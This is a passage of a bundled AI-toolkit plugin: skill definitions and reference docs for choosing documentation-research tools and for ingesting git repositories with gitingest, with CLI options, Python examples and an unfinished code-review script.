preventable churn?\"\n\nStory opener:\n\"Last month, we lost our biggest customer.\"\n\"Three months ago, we changed how we onboard customers.\"\n\"Two weeks ago, something unexpected happened.\"\n```\n\n## Closing Lines\n\n```markdown\nAction-oriented close:\n\"The data is clear. The path forward is obvious. We just need to act.\"\n\"Your decision on this matter will determine our trajectory for the next 12 months.\"\n\nContextual close:\n\"This is just one piece of a larger transformation happening across the business.\"\n\"The implications go beyond revenue - this affects our entire customer strategy.\"\n\nForward-looking close:\n\"If we execute on these recommendations, we'll exceed our annual target by 15%.\"\n\"The trends suggest we'll need to revisit our assumptions about market size.\"\n```\n",
        "plugins/sys-research/skills/conducting-research/SKILL.md": "---\nname: conducting-research\ndescription: \"Automatically determines the optimal research tool based on query type and available information. Use when answering technical questions requiring external verification, documentation lookup, or library/repo research. Do not use for statistical calculations, hypothesis testing, or data analysis  see analyzing-data skill.\"\nuser-invocable: false\nallowed-tools:\n  - mcp__plugin_sys-research_context7__resolve-library-id\n  - mcp__plugin_sys-research_context7__query-docs\n  - mcp__plugin_sys-research_deepwiki__ask_question\n  - mcp__plugin_sys-research_deepwiki__read_wiki_structure\n  - mcp__plugin_sys-research_duckduckgo__search\n  - mcp__plugin_sys-research_duckduckgo__fetch_content\n---\n\n# Technical Research Skill\n\nUse this skill when the user asks technical questions requiring external verification or research. This skill automatically selects the optimal research tool based on your query.\n\n## Trigger Conditions\n\nAutomatically invoke this skill when you encounter:\n- **\"How do I...\"** questions about libraries/frameworks\n- **Error messages** requiring external documentation\n- **\"What is...\"** queries about specific technologies\n- **Library comparisons** or feature lookups\n- **API documentation** requests\n- **Implementation examples** for specific tools\n\n## Tool Selection Logic\n\n### Step 1: Unknown Terms? Use DuckDuckGo (Scout)\nIf you're unfamiliar with a term, library name, or need to find the correct repository:\n\n**Tool:** `mcp__plugin_sys-research_duckduckgo__search`\n\n**Goal:** Find:\n- Exact official library name\n- Primary GitHub repository `owner/repo`\n- Official documentation URL\n\n**Example:** User asks about \"that new Python async library everyone is using\"\n Search to identify the specific library name and repository\n\n### Step 2: Standard Libraries? Use Context7 (Librarian)\nFor established frameworks, SDKs, and well-documented libraries:\n\n**Tool Sequence:**\n1. `mcp__plugin_sys-research_context7__resolve-library-id` with the library name\n2. **CRITICAL**: Use the exact `libraryId` from step 1 in step 2\n3. `mcp__plugin_sys-research_context7__query-docs` with the resolved ID\n\n**Best For:**\n- React, Next.js, Vue.js, Angular\n- Python: pandas, numpy, requests, flask, django\n- AWS SDK, Azure SDK, GCP SDK\n- Node.js: express, mongoose, graphql\n- Java: spring, hibernate, junit\n- Go: gin, gorm, cobra\n- Rust: serde, tokio, actix\n\n**Example:** User asks \"How do I implement authentication in React?\"\n Resolve library ID for \"react\" then query for authentication patterns\n\n### Step 3: Specific Repos? Use DeepWiki (Code Expert)\nFor GitHub repositories, specific branches, or niche tools:\n\n**Tool:** `mcp__plugin_sys-research_deepwiki__ask_question` or `mcp__plugin_sys-research_deepwiki__read_wiki_structure`\n\n**Best For:**\n- GitHub repositories (e.g., \"owner/repo-name\")\n- Specific branches or commits\n- Open source project internals\n- Niche or experimental libraries\n- Understanding specific file structures\n\n**Example:** User asks \"How does the dev branch of vercel/next.js implement edge runtime?\"\n Use DeepWiki with repoName \"vercel/next.js\" and branch \"dev\"\n\n## Decision Tree\n\n```\nQuery Type\n Contains library name I recognize?\n    YES  Is it a standard framework/library?\n       YES  Context7 (resolve  query)\n       NO  DuckDuckGo (identify)  DeepWiki\n    NO  DuckDuckGo (identify)\n Mentions specific GitHub repo?\n    YES  DeepWiki (ask_question)\n Asking for general understanding?\n     YES  DeepWiki (read_wiki_structure)\n```\n\n## Failure Handling\n\n### Context7 Resolution Fails\n**Fallback:** Use `mcp__plugin_sys-research_duckduckgo__search` to find:\n1. Correct library naming convention\n2. Official documentation URL\n3. Alternative names or aliases\n\nThen retry Context7 with the correct name.\n\n### Insufficient Documentation Data\n**Fallback:** Use `mcp__plugin_sys-research_duckduckgo__fetch_content` on:\n1. Official docs URL found via search\n2. GitHub README or wiki pages\n3. Community tutorials or guides\n\n### DeepWiki Returns Limited Info\n**Fallback:** Use `mcp__plugin_sys-research_duckduckgo__search` to find:\n1. Additional resources about the repository\n2. Community discussions or issues\n3. Related projects or alternatives\n\n## Response Format\n\nStructure your answer as:\n\n```\n## Research Summary\n\n**Query:** [Restate the user's question]\n\n**Tools Used:** [List the MCP tools invoked]\n\n**Key Findings:**\n- [Bullet point 1 with citation]\n- [Bullet point 2 with citation]\n\n**Solution/Code Example:**\n```[language]\n[Complete, working code example]\n```\n\n**Explanation:**\n[Why this solution works based on the retrieved documentation/repo structure]\n```\n\n## Examples\n\n### Example 1: Standard Library Query\n**User:** \"How do I read a CSV file in Python?\"\n\n**Action:**\n1. Recognize \"pandas\" as standard library\n2. Call `resolve-library-id` for \"pandas\"\n3. Call `query-docs` with resolved ID for CSV reading\n4. Provide code example and explanation\n\n### Example 2: Unknown Library\n**User:** \"What's the best way to do state management in Svelte?\"\n\n**Action:**\n1. Not immediately familiar with Svelte state libraries\n2. Call `duckduckgo__search` for \"Svelte state management libraries\"\n3. Identify \"svelte/store\" as the official solution\n4. If needed, use Context7 or DeepWiki for deeper dive\n5. Provide comprehensive answer\n\n### Example 3: GitHub Repository\n**User:** \"How does authentication work in the Auth.js NextAuth repo?\"\n\n**Action:**\n1. Recognize this as GitHub repo-specific question\n2. Call `deepwiki__ask_question` with repoName \"next-auth/next-auth.js\"\n3. Ask specific question about authentication implementation\n4. Provide detailed answer with file references\n\n## Best Practices\n\n1. **Always verify** the library name before using Context7\n2. **Use the exact libraryId** returned from resolve-library-id\n3. **Cite sources** in your response (documentation paths, file locations)\n4. **Provide complete, working code examples**\n5. **Explain the \"why\"** not just the \"how\"\n6. **Chain tools intelligently** when one tool's output informs the next\n7. **Document your research process** so the user understands the methodology\n",
        "plugins/sys-research/skills/conducting-research/references/research-protocol.md": "# Research Protocol\n\nThis document defines the standard research methodology for technical investigations.\n\n## Phase 1: Identification (The Scout)\n\nIf the user has not specified a precise library version or GitHub repository, use `mcp__plugin_sys-research_duckduckgo__search` to identify:\n\n1. The exact official library name (for Context7).\n2. The primary GitHub repository `owner/repo` (for DeepWiki).\n\n## Phase 2: Deep Dive (The Specialist)\n\nSelect the best tool path based on Phase 1:\n\n### Path A: Established Frameworks (React, Next.js, Pandas)\nUse **Context7** for official documentation.\n\n1. Call `mcp__plugin_sys-research_context7__resolve-library-id` with the query and library name.\n2. **CRITICAL**: Use the exact `libraryId` returned from step 1 to call `mcp__plugin_sys-research_context7__query-docs`.\n3. Synthesize the documentation into a code solution.\n\n### Path B: Niche/New Tools or GitHub Repos\nUse **DeepWiki** for repository insights.\n\n1. If you need general understanding, use `mcp__plugin_sys-research_deepwiki__read_wiki_structure`.\n2. To solve specific problems, use `mcp__plugin_sys-research_deepwiki__ask_question` with the `repoName` identified in Phase 1.\n\n## Phase 3: Synthesis\n\nProvide a final answer that:\n\n1. Cites the specific documentation or file paths used.\n2. Provides a complete code example.\n3. Explains *why* this solution works based on the retrieved context.\n",
        "plugins/sys-research/skills/ingesting-git/SKILL.md": "---\nname: ingesting-git\ndescription: \"Transforms repositories into structured plain-text digests optimized for LLM consumption. Use when analyzing GitHub repositories, digesting codebases, or ingesting git repos for AI analysis.\"\nallowed-tools: [Read, Write, Edit, Bash, Grep]\n---\n\n# GitIngest Protocol\n\n\n\n## Quick Start\n\n**Execute via Script:**\n```bash\nuv run --with gitingest scripts/ingest.py <url_or_path> [options]\n```\n\n**Examples:**\n```bash\n# Ingest remote repo\nuv run --with gitingest scripts/ingest.py https://github.com/user/repo\n\n# Ingest with filtering\nuv run --with gitingest scripts/ingest.py . -i \"*.py\" -e \"tests/*\"\n```\n\n## Output Format\n\nGitIngest returns **structured plain-text** optimized for LLM consumption with three distinct sections:\n\n**Section 1: Repository Summary**\n```\nRepository: owner/repo-name\nFiles analyzed: 42\nEstimated tokens: 15.2k\n```\n\n**Section 2: Directory Structure**\n```\nDirectory structure:\n project-name/\n     src/\n        main.py\n        utils.py\n     tests/\n        test_main.py\n     README.md\n```\n\n**Section 3: File Contents**\n```\n================================================\nFILE: src/main.py\n================================================\ndef hello_world():\n    print(\"Hello, World!\")\n```\n\n## Configuration Options\n\n| Option | Purpose | Example |\n|:-------|:--------|:--------|\n| `-i` / `--include-pattern` | Include files matching patterns | `-i \"*.py\" -i \"*.js\"` |\n| `-e` / `--exclude-pattern` | Exclude files matching patterns | `-e \"node_modules/*\"` |\n| `-s` / `--max-size` | Maximum file size in bytes | `-s 102400` |\n| `-b` / `--branch` | Specify branch | `-b main` |\n| `-t` / `--token` | GitHub access token | `-t $GITHUB_TOKEN` |\n| `-o` | Output file (or `-` for stdout) | `-o digest.txt` |\n\n## Common Exclude Patterns\n\n```\nnode_modules/*          # Dependencies\n*.log                   # Log files\ndist/*                  # Build outputs\nbuild/*                 # Build directories\n*.min.js                # Minified files\n*.lock                  # Lock files\n```\n\n## Implementation Protocol\n\nWhen executing the gitingest skill:\n\n1. **Assess Requirements**\n   - Determine if CLI or Python integration is needed\n   - Identify repository size and scope\n   - Plan filtering strategy (include/exclude patterns)\n\n2. **Setup Environment**\n   - Verify gitingest installation\n   - Check authentication for private repositories\n   - Configure output destination\n\n3. **Execute Ingestion**\n   - Run gitingest with appropriate parameters\n   - Monitor for errors and timeouts\n   - Apply filtering and size limits\n\n4. **Process Results**\n   - Parse the three-section output format\n   - Analyze summary, tree, and content\n   - Generate insights and reports\n\n## Extended Documentation\n\nFor detailed integration examples, error handling patterns, and best practices:\n- **Integration Examples:** `references/integration-examples.md`\n\n\n\n## Integration with CatToolkit\n\n**Usage Examples:**\n```bash\n# \"Ingest this repository for AI analysis\"\n#  Uses gitingest to create structured digest\n\n# \"Analyze the codebase without dependencies\"\n#  Uses gitingest with exclude-patterns for node_modules, dist, etc.\n\n# \"Generate documentation from this repo\"\n#  Uses gitingest + filtering to extract docs and code structure\n```\n\nThe gitingest skill integrates seamlessly with other CatToolkit skills:\n- **deep-analysis**: Process gitingest output for comprehensive insights\n- **software-engineering**: Analyze ingested code for quality and security\n- **prompt-engineering**: Use repository context to generate better prompts\n",
        "plugins/sys-research/skills/ingesting-git/references/api-reference.md": "# GitIngest API Reference\n\n## Python Package API\n\n### Core Functions\n\n#### `ingest(repo_url: str, **kwargs) -> Tuple[str, str, str]`\n\n**Synchronous repository ingestion**\n\n**Parameters:**\n- `repo_url` (str): Git repository URL (GitHub, GitLab, etc.)\n- `token` (str, optional): Authentication token for private repositories\n- `max_file_size` (int, optional): Maximum file size in bytes (default: unlimited)\n- `include_patterns` (List[str], optional): Files to include (Unix shell patterns)\n- `exclude_patterns` (List[str], optional): Files to exclude (Unix shell patterns)\n- `branch` (str, optional): Specific branch to analyze (default: repository default)\n\n**Returns:**\n- `Tuple[str, str, str]`: (summary, tree, content)\n  - `summary`: Repository metadata (name, file count, token estimate)\n  - `tree`: Directory structure in text format\n  - `content`: All file contents with clear delimiters\n\n**Raises:**\n- `GitIngestError`: General ingestion errors\n- `AuthenticationError`: Invalid or missing token\n- `RateLimitError`: API rate limit exceeded\n- `NetworkError`: Connection or timeout issues\n\n**Example:**\n```python\nfrom gitingest import ingest\n\n# Basic usage\nsummary, tree, content = ingest(\"https://github.com/user/repo\")\n\n# With options\nsummary, tree, content = ingest(\n    \"https://github.com/user/private-repo\",\n    token=\"ghp_xxxxxxxxxxxx\",\n    max_file_size=51200,\n    include_patterns=[\"*.py\", \"*.js\"],\n    exclude_patterns=[\"node_modules/*\", \"*.log\"],\n    branch=\"develop\"\n)\n```\n\n#### `ingest_async(repo_url: str, **kwargs) -> asyncio.Future`\n\n**Asynchronous repository ingestion**\n\n**Parameters:** Same as `ingest()`\n\n**Returns:**\n- `asyncio.Future`: Future object containing (summary, tree, content) tuple\n\n**Example:**\n```python\nimport asyncio\nfrom gitingest import ingest_async\n\nasync def main():\n    future = ingest_async(\"https://github.com/user/repo\")\n    summary, tree, content = await future\n\nasyncio.run(main())\n```\n\n### Utility Functions\n\n#### `parse_summary(summary: str) -> Dict[str, Any]`\n\nParse repository summary into structured data.\n\n**Example:**\n```python\nfrom gitingest import parse_summary\n\nsummary_text = \"Repository: octocat/hello-world\\nFiles analyzed: 1\\nEstimated tokens: 29\"\nparsed = parse_summary(summary_text)\n# Returns: {'repo': 'octocat/hello-world', 'files': 1, 'tokens': 29}\n```\n\n#### `parse_tree(tree: str) -> Dict[str, Any]`\n\nParse directory tree into nested dictionary structure.\n\n**Example:**\n```python\nfrom gitingest import parse_tree\n\ntree_text = \"Directory structure:\\n project-name/\\n     src/\\n     README.md\"\nparsed = parse_tree(tree_text)\n# Returns: {'project-name': {'src': {}, 'README.md': None}}\n```\n\n#### `split_content(content: str) -> Iterator[str]`\n\nSplit file contents into individual files for processing.\n\n**Example:**\n```python\nfrom gitingest import split_content\n\nall_content = \"================================================\\nFILE: src/main.py\\n================================================\\n...\"\nfor file_content in split_content(all_content):\n    process_file(file_content)\n```\n\n### Exception Classes\n\n#### `GitIngestError(Exception)`\n\nBase exception for all gitingest errors.\n\n**Subclasses:**\n- `AuthenticationError`: Token authentication failed\n- `RateLimitError`: API rate limit exceeded\n- `NetworkError`: Network connectivity issues\n- `RepositoryError`: Repository access errors (private, deleted, etc.)\n- `ParsingError`: Content parsing errors\n\n**Example:**\n```python\nfrom gitingest import ingest\nfrom gitingest.utils.exceptions import GitIngestError, AuthenticationError\n\ntry:\n    summary, tree, content = ingest(repo_url, token=token)\nexcept AuthenticationError:\n    print(\"Invalid authentication token\")\nexcept RateLimitError:\n    print(\"Rate limit exceeded, please wait\")\nexcept GitIngestError as e:\n    print(f\"GitIngest error: {e}\")\n```\n\n## CLI Reference\n\n### Command Syntax\n\n```bash\ngitingest [OPTIONS] REPOSITORY_URL\n```\n\n### Options\n\n#### `-o, --output FILE`\nOutput destination (default: `digest.txt`)\n- Use `-` for stdout\n- Use filename to save to file\n\n**Examples:**\n```bash\ngitingest repo-url -o digest.txt     # Save to file\ngitingest repo-url -o -              # Stream to stdout\n```\n\n#### `-s, --max-size BYTES`\nMaximum file size in bytes\n- Default: No limit\n- Common: 51200 (50KB), 102400 (100KB)\n\n**Examples:**\n```bash\ngitingest repo-url -s 51200           # 50KB limit\ngitingest repo-url -s 102400         # 100KB limit\n```\n\n#### `-i, --include-pattern PATTERN`\nInclude files matching pattern (can be used multiple times)\n- Supports Unix shell wildcards: `*`, `?`, `[chars]`\n- Example: `*.py`, `*.js`, `src/*.ts`\n\n**Examples:**\n```bash\ngitingest repo-url -i \"*.py\" -i \"*.js\"\ngitingest repo-url -i \"src/*\" -i \"tests/*\"\n```\n\n#### `-e, --exclude-pattern PATTERN`\nExclude files matching pattern (can be used multiple times)\n- Common patterns: `node_modules/*`, `*.log`, `dist/*`\n\n**Examples:**\n```bash\ngitingest repo-url -e \"node_modules/*\" -e \"*.log\"\ngitingest repo-url -e \"dist/*\" -e \"build/*\"\n```\n\n#### `-b, --branch BRANCH`\nSpecific branch to analyze\n- Default: Repository's default branch\n\n**Examples:**\n```bash\ngitingest repo-url -b main\ngitingest repo-url -b develop\ngitingest repo-url -b feature/new-auth\n```\n\n#### `-t, --token TOKEN`\nGitHub personal access token for private repositories\n- Alternative: Set `GITHUB_TOKEN` environment variable\n\n**Examples:**\n```bash\ngitingest repo-url -t ghp_xxxxxxxxxxxx\nexport GITHUB_TOKEN=\"ghp_xxxxxxxxxxxx\"\ngitingest repo-url  # Uses environment variable\n```\n\n#### `--version`\nShow version information and exit\n\n#### `--help`\nShow help message and exit\n\n### CLI Examples\n\n**Basic Usage:**\n```bash\n# Download and save to digest.txt\ngitingest https://github.com/octocat/Hello-World\n\n# Stream to stdout\ngitingest https://github.com/octocat/Hello-World -o -\n\n# Save to custom file\ngitingest https://github.com/octocat/Hello-World -o my-repo.txt\n```\n\n**Filtered Analysis:**\n```bash\n# Python files only\ngitingest repo-url -i \"*.py\" -o -\n\n# Multiple file types\ngitingest repo-url -i \"*.py\" -i \"*.js\" -i \"*.md\" -o -\n\n# Exclude dependencies\ngitingest repo-url -e \"node_modules/*\" -e \"*.log\" -o -\n\n# Combine filters\ngitingest repo-url \\\n  -i \"*.py\" -i \"*.js\" \\\n  -e \"test/*\" -e \"node_modules/*\" \\\n  -o -\n```\n\n**Advanced Options:**\n```bash\n# Large repo with size limit\ngitingest repo-url -s 51200 -o -\n\n# Specific branch\ngitingest repo-url -b develop -o -\n\n# Private repository\ngitingest repo-url -t $GITHUB_TOKEN -o -\n\n# All options combined\ngitingest repo-url \\\n  -i \"*.py\" -i \"*.js\" \\\n  -e \"node_modules/*\" -e \"*.log\" \\\n  -s 102400 \\\n  -b main \\\n  -t $GITHUB_TOKEN \\\n  -o my-analysis.txt\n```\n\n## Output Format Specification\n\n### Section 1: Summary\n\n**Format:**\n```\nRepository: {owner}/{repo-name}\nFiles analyzed: {count}\nEstimated tokens: {number}k\n```\n\n**Example:**\n```\nRepository: octocat/hello-world\nFiles analyzed: 1\nEstimated tokens: 29\n```\n\n**Token Estimation:**\n- Used for LLM planning and context budgeting\n- Based on average 4 characters per token\n- Helps determine if content fits in context window\n\n### Section 2: Directory Structure\n\n**Format:**\n```\nDirectory structure:\n {root-dir}/\n     {subdir1}/\n        {file1}\n        {file2}\n     {file}\n```\n\n**Example:**\n```\nDirectory structure:\n octocat-hello-world/\n     README\n```\n\n**Notes:**\n- Tree structure uses Unicode box-drawing characters\n- Indentation shows directory hierarchy\n- Maximum depth preserved for readability\n\n### Section 3: File Contents\n\n**Format:**\n```\n================================================\nFILE: {path/to/file}\n================================================\n{file contents}\n================================================\n\n================================================\nFILE: {next-file}\n================================================\n{contents}\n================================================\n\n```\n\n**Example:**\n```\n================================================\nFILE: README\n================================================\nHello World!\n\n================================================\n\n================================================\nFILE: src/main.py\n================================================\ndef hello():\n    print(\"Hello, World!\")\n\n================================================\n\n```\n\n**Notes:**\n- Clear delimiters between files\n- Relative paths from repository root\n- Preserves exact file contents (including whitespace)\n- Empty line added after each file for separation\n\n## Configuration\n\n### Environment Variables\n\n#### `GITHUB_TOKEN`\nGitHub personal access token for private repositories.\n\n**Usage:**\n```bash\nexport GITHUB_TOKEN=\"ghp_xxxxxxxxxxxx\"\ngitingest https://github.com/user/private-repo\n```\n\n**Token Requirements:**\n- Must have `repo` scope for private repositories\n- Can be set in `.bashrc`, `.zshrc`, or shell session\n- Never hardcode in scripts or version control\n\n### Python Configuration\n\n```python\n# Custom configuration\nimport gitingest\n\n# Set default options\ngitingest.set_config({\n    'max_file_size': 51200,\n    'default_branch': 'main',\n    'timeout': 30\n})\n\n# Use custom configuration\nsummary, tree, content = ingest(repo_url)\n```\n\n### Configuration File Support\n\n**`.gitingest.yaml` (optional):**\n```yaml\ndefaults:\n  max_file_size: 51200\n  include_patterns:\n    - \"*.py\"\n    - \"*.js\"\n    - \"*.md\"\n  exclude_patterns:\n    - \"node_modules/*\"\n    - \"*.log\"\n  branch: main\n```\n\n## Rate Limiting and Performance\n\n### Rate Limits\n- GitHub API: 60 requests/hour for unauthenticated\n- GitHub API: 5000 requests/hour with authentication\n- Built-in delays to respect rate limits\n\n### Performance Tips\n1. **Use authentication** for private repos and higher rate limits\n2. **Filter aggressively** with include/exclude patterns\n3. **Set size limits** for large repositories\n4. **Batch processing** with async for multiple repos\n5. **Cache results** to avoid repeated API calls\n\n### Memory Management\n- Large repositories automatically chunked\n- Stream processing available for very large repos\n- Configurable memory limits per file\n- Garbage collection between batches\n\n## Error Codes and Troubleshooting\n\n### Common Errors\n\n#### Error: \"Repository not found\"\n**Cause:** Repository is private, deleted, or URL is incorrect\n**Solution:**\n- Check repository URL\n- Add authentication token for private repos\n- Verify token has correct permissions\n\n#### Error: \"Rate limit exceeded\"\n**Cause:** Too many requests in short time period\n**Solution:**\n- Add authentication token\n- Implement delays between requests\n- Use exponential backoff retry logic\n\n#### Error: \"Network timeout\"\n**Cause:** Slow network or large repository\n**Solution:**\n- Increase timeout value\n- Try again during off-peak hours\n- Use selective filtering to reduce data\n\n#### Error: \"File too large\"\n**Cause:** File exceeds max_file_size limit\n**Solution:**\n- Increase max_file_size parameter\n- Use exclude_patterns to skip large files\n- Split repository into smaller chunks\n\n### Debug Mode\n\n```python\nimport logging\nlogging.basicConfig(level=logging.DEBUG)\n\n# Now all gitingest operations will log debug info\nsummary, tree, content = ingest(repo_url)\n```\n\n### Verbose CLI Output\n\n```bash\ngitingest --verbose repo-url -o -\n# Shows detailed progress and API calls\n```\n",
        "plugins/sys-research/skills/ingesting-git/references/best-practices.md": "# GitIngest Best Practices\n\n## Context Hygiene (Anti-Bloat)\n\nWhen ingesting repositories larger than 10 files or 50KB:\n\n**DO NOT** stream directly to stdout/context:\n```bash\n# BAD - Pollutes context window\ngitingest https://github.com/large/repo -o -\n```\n\n**DO** stream to a temporary file, then read specific sections:\n```bash\n# GOOD - Keeps context clean\ngitingest https://github.com/large/repo -o .cattoolkit/context/repo_digest.txt\ngrep -A 20 \"function_name\" .cattoolkit/context/repo_digest.txt\n```\n\n## Filtering Strategy\n\nAlways apply filters to maximize signal-to-noise ratio:\n1. **Exclude Lockfiles**: `-e \"*.lock\"`\n2. **Exclude Assets**: `-e \"*.png\" -e \"*.svg\"`\n3. **Target Source**: `-i \"src/*\"`\n",
        "plugins/sys-research/skills/ingesting-git/references/integration-examples.md": "# GitIngest Integration Examples\n\n## CLI Integration Examples\n\n**Basic usage - stream to AI processor:**\n```bash\ngitingest https://github.com/user/repo -o - | your_ai_processor\n```\n\n**Selective file analysis:**\n```bash\ngitingest https://github.com/user/repo \\\n  -i \"*.py\" -i \"*.js\" -i \"*.md\" \\\n  -s 102400 \\\n  -o - | python your_analyzer.py\n```\n\n**Exclude unwanted files:**\n```bash\ngitingest https://github.com/user/repo \\\n  -e \"node_modules/*\" -e \"*.log\" -e \"dist/*\" \\\n  -o - | your_analyzer\n```\n\n**Private repositories with token:**\n```bash\nexport GITHUB_TOKEN=\"ghp_your_token_here\"\ngitingest https://github.com/user/private-repo -t $GITHUB_TOKEN -o -\n```\n\n**Specific branch analysis:**\n```bash\ngitingest https://github.com/user/repo -b main -o -\n```\n\n## Python Package Integration\n\n**Synchronous processing:**\n```python\nfrom gitingest import ingest, ingest_async\nimport asyncio\n\ndef analyze_repository(repo_url: str):\n    summary, tree, content = ingest(repo_url)\n\n    # Process metadata\n    repo_info = parse_summary(summary)\n\n    # Analyze structure\n    file_structure = parse_tree(tree)\n\n    # Process code content\n    return analyze_code(content)\n```\n\n**Asynchronous processing for batch analysis:**\n```python\nasync def batch_analyze_repos(repo_urls: list):\n    tasks = [ingest_async(url) for url in repo_urls]\n    results = await asyncio.gather(*tasks)\n    return [process_repo_data(*result) for result in results]\n```\n\n**Memory-efficient processing for large repos:**\n```python\ndef stream_process_repo(repo_url: str):\n    summary, tree, content = ingest(\n        repo_url,\n        max_file_size=51200,  # 50KB max per file\n        include_patterns=[\"*.py\", \"*.js\"],  # Focus on code files\n    )\n\n    # Process in chunks to manage memory\n    for file_content in split_content(content):\n        yield analyze_file(file_content)\n```\n\n## Installation\n\n**CLI Installation:**\n```bash\n# Best practice: Use pipx for isolated environment\npipx install gitingest\n\n# Alternative: Use pip\npip install gitingest\n\n# Verify installation\ngitingest --help\ngitingest --version\n```\n\n**Python Package Installation:**\n```bash\n# For projects: Use virtual environment\npython -m venv gitingest-env\nsource gitingest-env/bin/activate  # On Windows: gitingest-env\\Scripts\\activate\npip install gitingest\n\n# Add to requirements.txt\necho \"gitingest\" >> requirements.txt\npip install -r requirements.txt\n\n# For development: Install with dev dependencies\npip install gitingest[dev,server]\n```\n\n## Error Handling\n\n**Robust ingestion with retry logic:**\n```python\nfrom gitingest import ingest\nfrom gitingest.utils.exceptions import GitIngestError\nimport time\n\ndef robust_ingest(repo_url: str, retries: int = 3):\n    \"\"\"Robust ingestion with retry logic\"\"\"\n    for attempt in range(retries):\n        try:\n            return ingest(repo_url)\n        except GitIngestError as e:\n            if attempt == retries - 1:\n                return None, None, f\"Failed to ingest: {e}\"\n            time.sleep(2 ** attempt)  # Exponential backoff\n\ndef ingest_private_repo(repo_url: str):\n    \"\"\"Secure private repository access\"\"\"\n    import os\n    token = os.getenv('GITHUB_TOKEN')\n    if not token:\n        raise ValueError(\"GITHUB_TOKEN environment variable required\")\n    return ingest(repo_url, token=token)\n```\n\n## Common Use Cases\n\n| Use Case | Method | Example |\n|----------|--------|---------|\n| **Code Review Bot** | Python async | `await ingest_async(pr_repo)`  analyze changes |\n| **Documentation Generator** | CLI with filtering | `gitingest repo -i \"*.py\" -i \"*.md\" -o -` |\n| **Vulnerability Scanner** | Python with error handling | Batch process multiple repos |\n| **Code Search Engine** | CLI  Vector DB | `gitingest repo -o - \\| embed \\| store` |\n| **AI Coding Assistant** | Python integration | Load repo context into conversation |\n| **CI/CD Analysis** | CLI integration | `gitingest repo -o - \\| analyze_pipeline` |\n| **Repository Summarization** | Python with streaming | Process large repos in chunks |\n| **Dependency Analysis** | CLI exclude patterns | `gitingest repo -e \"node_modules/*\" -e \"*.lock\" -o -` |\n| **Security Audit** | CLI with size limits | `gitingest repo -i \"*.py\" -i \"*.js\" -s 204800 -o -` |\n\n## Best Practices\n\n**For Complete Analysis:**\n```python\ndef comprehensive_repo_scan(repo_url: str):\n    # Get everything\n    summary, tree, content = ingest(repo_url)\n\n    # Parse and analyze\n    repo_data = {\n        'metrics': parse_summary_metrics(summary),\n        'structure': parse_directory_tree(tree),\n        'files': parse_file_contents(content)\n    }\n\n    return generate_analysis_report(repo_data)\n```\n\n**For Focused Analysis:**\n```python\ndef code_only_analysis(repo_url: str):\n    # Filter to source code only\n    summary, tree, content = ingest(\n        repo_url,\n        include_patterns=[\"*.py\", \"*.js\", \"*.ts\", \"*.go\", \"*.rs\"],\n        exclude_patterns=[\"test/*\", \"*/test/*\", \"docs/*\"],\n        max_file_size=102400  # 100KB limit\n    )\n\n    return analyze_source_code(content)\n```\n\n**Memory Management:**\n```python\ndef memory_efficient_analysis(repo_url: str):\n    # Process in stages to manage memory\n\n    # Stage 1: Get overview\n    summary, tree, _ = ingest(repo_url)\n    file_count = extract_file_count(summary)\n\n    # Stage 2: Process by language if large\n    if file_count > 100:\n        results = {}\n        for lang in [\"*.py\", \"*.js\", \"*.ts\"]:\n            _, _, content = ingest(\n                repo_url,\n                include_patterns=[lang],\n                max_file_size=51200\n            )\n            results[lang] = analyze_language_specific(content)\n        return results\n    else:\n        # Small repo, process all at once\n        _, _, content = ingest(repo_url)\n        return analyze_all_code(content)\n```\n\n**Batch Processing:**\n```python\nasync def batch_process_repositories(repo_urls: list):\n    \"\"\"Process multiple repositories concurrently\"\"\"\n    semaphore = asyncio.Semaphore(5)  # Limit concurrent requests\n\n    async def process_single_repo(url):\n        async with semaphore:\n            try:\n                summary, tree, content = await ingest_async(url)\n                return {\n                    'url': url,\n                    'status': 'success',\n                    'data': (summary, tree, content)\n                }\n            except Exception as e:\n                return {\n                    'url': url,\n                    'status': 'error',\n                    'error': str(e)\n                }\n\n    # Process all repositories\n    tasks = [process_single_repo(url) for url in repo_urls]\n    results = await asyncio.gather(*tasks)\n\n    return results\n```\n",
        "plugins/sys-research/skills/ingesting-git/references/integration-patterns.md": "# GitIngest Integration Patterns\n\n## Pattern 1: Code Review Automation\n\n### Use Case\nAutomated code review for pull requests by analyzing repository changes.\n\n### Implementation\n\n**Python Script:**\n```python\nfrom gitingest import ingest_async\nimport asyncio\nimport json\n\nasync def analyze_pr_changes(repo_url: str, pr_number: int):\n    \"\"\"\n    Analyze PR changes for code review insights\n    \"\"\"\n    # Get repository content\n    summary, tree, content = await ingest_async(repo_url)\n\n    # Parse changes\n    files = parse_file_contents(content)\n\n    # Analyze each file\n    review_insights = {\n        'total_files': len(files),\n        'languages': detect_languages(files),\n        'complex_files': identify_complex_files(files),\n        'security_issues': scan_security(files),\n        'test_coverage': check_test_coverage(files)\n    }\n\n    # Generate review report\n    report = generate_review_report(review_insights)\n\n    return report\n\ndef parse_file_contents(content: str) -> list:\n    \"\"\"Split content into individual files\"\"\"\n    files = []\n    current_file = None\n\n    for line in content.split('\\n'):\n        if line.startswith('FILE: '):\n            if current_file:\n                files.append(current_file)\n            current_file = {\n                'path': line.replace('FILE: ', ''),\n                'content': []\n            }\n        elif current_file and line.strip():\n            current_file['content'].append(line)\n\n    if current_file:\n        files.append(current_file)\n\n    return files\n\ndef detect_languages(files: list) -> dict:\n    \"\"\"Detect programming languages used\"\"\"\n    extensions = {}\n    for file in files:\n        ext = file['path'].split('.')[-1] if '.' in file['path'] else 'unknown'\n        extensions[ext] = extensions.get(ext, 0) + 1\n    return extensions\n\ndef identify_complex_files(files: list) -> list:\n    \"\"\"Identify potentially complex files\"\"\"\n    complex_files = []\n    for file in files:\n        lines = len(file['content'])\n        # Consider files with >200 lines as complex\n        if lines > 200:\n            complex_files.append({\n                'path': file['path'],\n                'lines': lines,\n                'reason': 'High line count'\n            })\n    return complex_files\n\ndef scan_security(files: list) -> list:\n    \"\"\"Basic security scanning\"\"\"\n    security_issues = []\n    security_keywords = ['eval(', 'exec(', 'os.system', 'subprocess.call']\n\n    for file in files:\n        file_content = '\\n'.join(file['content'])\n        for keyword in security_keywords:\n            if keyword in file_content:\n                security_issues.append({\n                    'file': file['path'],\n                    'keyword': keyword,\n                    'severity': 'high'\n                })\n\n    return security_issues\n\ndef check_test_coverage(files: list) -> dict:\n    \"\"\"Check for test files\"\"\"\n    test_files = [f for f in files if 'test' in f['path'].lower()]\n    source_files = [f for f in files if not 'test' in f['path'].lower()]\n\n    return {\n        'test_files': len(test_files),\n        'source_files': len(source_files),\n        'ratio': 